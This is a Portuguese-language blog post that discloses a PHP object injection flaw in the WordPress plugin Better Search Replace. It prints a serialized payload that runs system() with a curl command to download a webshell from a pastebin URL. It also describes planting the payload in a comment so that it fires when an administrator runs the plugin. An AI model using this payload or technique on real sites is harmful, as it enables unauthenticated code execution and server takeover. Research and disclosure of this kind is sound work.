---
layout: post
title: PHP Object Injection no Better Search Replace
permalink: /web/php-object-injection-better-search-replace
---

**Atenção**: A técnica demonstrada neste artigo tem o propósito de ser um material educativo, a exploração foi feita em um ambiente controlado. Não realize esta exploração sem a autorização do dono do servidor, pois isto poderá resultar em um crime!

![](/imgs/php-object-injection-better-search-replace/plugin_info.png)

O Better Search Replace é um plugin que possui a função de fazer exatamente o que o nome dele sugere, ele busca uma string na sua base de dados do Wordpress e substitui por outra string que você forneceu.

Sinceramente não entendo porque é tão usado, segundo o Wordpress, existem **mais de 1 milhão de instalações ativas**.

![](/imgs/php-object-injection-better-search-replace/search.png)

![](/imgs/php-object-injection-better-search-replace/serialization.png)

Dentre suas funcionalidades, o plugin consegue realizar o processamento de objetos PHP serializados, então resolvi fazer Code Review deste plugin.

![](/imgs/php-object-injection-better-search-replace/func_unserialize.png)

Depois de algum tempo na análise estática, encontrei o trecho de código responsável por realizar a deserialização. Achei interessante, logo comecei a análise dinâmica.

Infelizmente não consegui iniciar uma POP Chain utilizando o próprio plugin (que por acaso tornaria a vulnerabilidade bem mais crítica) :disappointed:. Por sorte, o Wordpress permite que um plugin consiga acessar as classes ou funções que foram definidas em outros plugins, ou seja, não existe um "sandbox". Consequentemente, isto abre a possibilidade de criarmos payloads reutilizando o código-fonte de outro plugin para iniciar o POP chains.

Para facilitar a minha vida, criei o plugin ["WP Object Injection Proof of Concept"](https://github.com/growlnx/WP-Object-Injection-PoC), este plugin possibilita o ataque de **Reutilização de Código**, me poupando tempo com **POP Chains**.

![](/imgs/php-object-injection-better-search-replace/plugin_vuln.png)

Ele se resume a nessa pequena classe. Caso deseje reproduzir em um cenário mais aproximado da realidade, recomendo que veja o [PHPGGC](https://github.com/ambionics/phpggc), pode te ajudar.

Nesta PoC vou utilizar o seguinte payload:

{% highlight php %}
O:2:”OI”:2:{s:3:”cmd”;s:48:”curl -o ws.php https://pastebin.com/raw/E3cNN0Zy“;s:3:”fcn”;s:6:”system”;}
{% endhighlight %}

Agora só resta saber onde devemos realizar a injeção... que tal nos comentários?

![](/imgs/php-object-injection-better-search-replace/tabela.png)

O plugin permite que o usuário realize o processamento na tabela de comentários, isso é bem legal, pois podemos injetar o payload nos comentários e esperar a iteração do administrador no plugin **Better Search Replace** para disparar a substituição.

![](/imgs/php-object-injection-better-search-replace/comment_evil.png)

Como pode se observar na imagem acima, o administrador é notificado a respeito do comentário, logo, também será necessário contar a sorte.

![](/imgs/php-object-injection-better-search-replace/request_admin_search.png)

Se o payload for interpretado, o download de uma simples webshell será realizado no diretório "wp-admin".

![](/imgs/php-object-injection-better-search-replace/rce.png)

*Voilà*!, foi possível obter uma unauth RCE através de uma deserialização insegura.